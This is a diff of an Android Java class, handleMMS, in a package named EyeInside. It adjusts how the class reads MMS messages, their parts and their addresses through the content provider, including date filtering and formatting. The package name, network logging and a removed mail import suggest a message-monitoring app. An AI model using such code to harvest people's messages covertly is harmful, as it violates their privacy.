@@ -1,20 +1,14 @@
 package com.code4bones.EyeInside;
 
-import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.InputStream;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
-import java.util.List;
-
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 import android.os.Message;
 
-import com.code4bones.utils.Mail;
 import com.code4bones.utils.NetLog;
 
 final class handleMMS extends Handler {
@@ -50,16 +44,21 @@ final class handleMMS extends Handler {
 	} // handleMessage
 	
 	
+	public String dateParam = null;
+	
 	public void eachMMS() {
-		Cursor cur = mContext.getContentResolver().query(URI, null, null, null, "_id DESC");
+		Cursor cur = mContext.getContentResolver().query(URI, new String[]{}, dateParam, null, "_id DESC");
 		if ( cur == null || !cur.moveToFirst() ) {
 			NetLog.v("Not MMS Found!");
 			return;
 		}
+		//for ( String col : cur.getColumnNames()) NetLog.v("MMS/ %s -> %s",col,cur.getString(cur.getColumnIndex(col)));
+		
 		do {
 			String _id = cur.getString(cur.getColumnIndex("_id"));
 //			String tid = cur.getString(cur.getColumnIndex("thread_id"));
-			Date  date = new Date(cur.getLong(cur.getColumnIndex("date")));
+			Date  date = new Date(cur.getLong(cur.getColumnIndex("date"))*1000);
+			NetLog.v("MMS DATE %s",date.toLocaleString());
 			eachPART(_id,date);
 		} while ( cur.moveToNext());
 	}
@@ -80,7 +79,10 @@ final class handleMMS extends Handler {
 		} while ( cur.moveToNext());
 	}
 	
+	final public SimpleDateFormat mDF = new SimpleDateFormat("dd_MM_yyyy_HH_mm_ss");
+
 	public void eachPART(String _id,Date date) {
+		
 		Uri uriParts = Uri.parse("content://mms/"+_id+"/part");
 		Cursor cur = mContext.getContentResolver().query(uriParts,null, null, null, null);
 		if ( cur == null || !cur.moveToFirst() ) {
@@ -97,7 +99,7 @@ final class handleMMS extends Handler {
 			
 			if ( sdata != null ) {
 				SmsObj sms = new SmsObj(mContext,pid,name,sdata);
-				sms.date = sms.df.format(date);
+				sms.date = mDF.format(date);
 				eachADDR(_id,sms);
 				mFiles.add(sms);
 			}
